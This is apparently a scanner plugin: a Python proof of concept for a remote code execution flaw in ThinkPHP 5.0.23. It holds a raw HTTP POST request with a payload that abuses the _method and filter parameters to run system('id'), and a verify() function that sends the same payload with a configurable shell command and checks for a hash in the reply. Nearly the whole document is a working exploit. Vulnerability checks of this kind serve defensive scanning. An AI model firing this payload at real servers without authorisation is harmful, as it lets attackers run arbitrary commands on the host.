'''POC
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
'''

import requests
import random
import logging
import hashlib

from lib.core.md5 import random_md5

random_string, random_md5 = random_md5()


def verify(ip, port, cmd=f"echo -n '{random_string}'|md5sum|cut -d ' ' -f1"):
    data = {
        "_method": "__construct",
        "filter[]": "system",
        "method": "get",
        "server[REQUEST_METHOD]": f"{cmd}"
    }
    response = requests.post(
        f"http://{ip}:{port}/index.php?s=captcha", data=data)
    if random_md5 in response.text:
        return {
            "name": "ThinkPHP5 5.0.23 RCE",
            "target": f"{ip}:{port}"
        }
    else:
        return None
